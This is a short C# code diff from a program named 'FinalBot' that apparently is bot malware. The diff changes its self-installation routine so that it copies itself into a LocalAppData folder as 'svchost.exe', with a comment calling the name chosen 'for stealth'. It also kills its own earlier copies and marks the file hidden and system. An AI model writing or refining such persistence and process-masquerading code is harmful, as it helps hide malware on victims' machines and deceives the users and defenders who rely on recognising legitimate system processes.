@@ -17,8 +17,8 @@ namespace FinalBot
 
                 // Use LocalAppData as it is often less restricted than Roaming/Protect
                 string localData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-                string targetDir = Path.Combine(localData, "Microsoft", "Windows", "Media");
-                string targetPath = Path.Combine(targetDir, "winrs.exe"); // Different name to avoid conflicts
+                string targetDir = Path.Combine(localData, "Microsoft", "Windows", "UpdateService");
+                string targetPath = Path.Combine(targetDir, "svchost.exe"); // Named svchost for stealth
 
                 if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
 
@@ -27,9 +27,18 @@ namespace FinalBot
                     try
                     {
                         // Try to kill existing process if it prevents overwrite
-                        foreach (var p in Process.GetProcessesByName("winrs"))
+                        foreach (var p in Process.GetProcessesByName("svchost"))
                         {
-                            try { p.Kill(); p.WaitForExit(1000); } catch { }
+                            try 
+                            { 
+                                // Only kill if it's OUR svchost (checking path)
+                                if (p.MainModule?.FileName.ToLower() == targetPath.ToLower())
+                                {
+                                    p.Kill(); 
+                                    p.WaitForExit(1000); 
+                                }
+                            } 
+                            catch { }
                         }
                         File.Copy(selfPath, targetPath, true);
                         File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
